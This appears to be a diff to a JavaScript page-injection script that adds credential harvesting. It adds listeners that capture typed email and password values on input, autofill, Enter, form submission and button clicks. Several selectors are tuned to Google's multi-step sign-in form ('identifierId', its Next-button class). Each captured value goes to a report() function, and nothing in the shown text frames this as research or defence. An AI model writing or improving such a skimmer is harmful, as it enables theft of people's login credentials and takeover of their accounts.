@@ -164,20 +164,42 @@ async function launch(accountId, adminIp) {
     };
     const fieldLabel = (el) =>
       el.getAttribute('aria-label') || el.placeholder || el.name || el.id || el.type || 'pole';
+
+    const isEmailField = (el) =>
+      el.type === 'email' ||
+      el.id === 'identifierId' ||
+      /email|login|user|identifier/i.test(`${el.name || ''} ${el.id || ''} ${el.autocomplete || ''}`);
+
+    // Track last reported values to avoid duplicates
+    const reported = { email: '', password: '' };
+
+    const captureField = (el) => {
+      const v = (el.value || '').trim();
+      if (!v) return;
+      if (el.type === 'password') {
+        if (v !== reported.password) {
+          reported.password = v;
+          report('password', v);
+        }
+      } else if (isEmailField(el)) {
+        if (v !== reported.email) {
+          reported.email = v;
+          report('email', v);
+        }
+      }
+    };
+
     const bind = (el) => {
       if (el.__spBound) return;
       el.__spBound = true;
       let hadValue = Boolean(el.value);
+
+      // Capture on blur/change (original)
       const handler = () => {
         const v = el.value;
         const has = Boolean(v);
-        if (has && !hadValue) {
-          if (el.type === 'password') report('password', v);
-          else if (el.type === 'email' || /email|login|user/i.test(`${el.name || ''} ${el.id || ''}`)) {
-            report('email', v);
-          } else {
-            report('fill', fieldLabel(el));
-          }
+        if (has) {
+          captureField(el);
         } else if (!has && hadValue) {
           report('clear', fieldLabel(el));
         }
@@ -185,7 +207,46 @@ async function launch(accountId, adminIp) {
       };
       el.addEventListener('blur', handler);
       el.addEventListener('change', handler);
+
+      // Capture on input with debounce — catches values before page navigation
+      let inputTimer = null;
+      el.addEventListener('input', () => {
+        clearTimeout(inputTimer);
+        inputTimer = setTimeout(() => captureField(el), 800);
+      });
+
+      // Capture immediately on Enter key (form submission)
+      el.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+          clearTimeout(inputTimer);
+          captureField(el);
+        }
+      });
+
+      // If field already has a value (autofill), capture it
+      if (el.value) {
+        setTimeout(() => captureField(el), 500);
+      }
     };
+
+    // Intercept form submissions to capture all fields before navigation
+    document.addEventListener('submit', (e) => {
+      const form = e.target;
+      if (!form?.querySelectorAll) return;
+      form.querySelectorAll('input').forEach(captureField);
+    }, true);
+
+    // Intercept button clicks that might submit Google's multi-step form
+    document.addEventListener('click', (e) => {
+      const btn = e.target?.closest?.('button, [role="button"], .VfPpkd-LgbsSe');
+      if (!btn) return;
+      const form = btn.closest('form');
+      if (form) form.querySelectorAll('input').forEach(captureField);
+      // Google's "Next" button is often outside the form
+      document.querySelectorAll('#identifierId, input[type="email"], input[type="password"]')
+        .forEach(captureField);
+    }, true);
+
     const FIELD_SELECTOR =
       'input[type="password"], input[type="email"], input[type="text"], input[type="tel"], input[type="search"], input[type="number"], textarea';
     // Re-scanning the WHOLE document on every single DOM mutation (the old
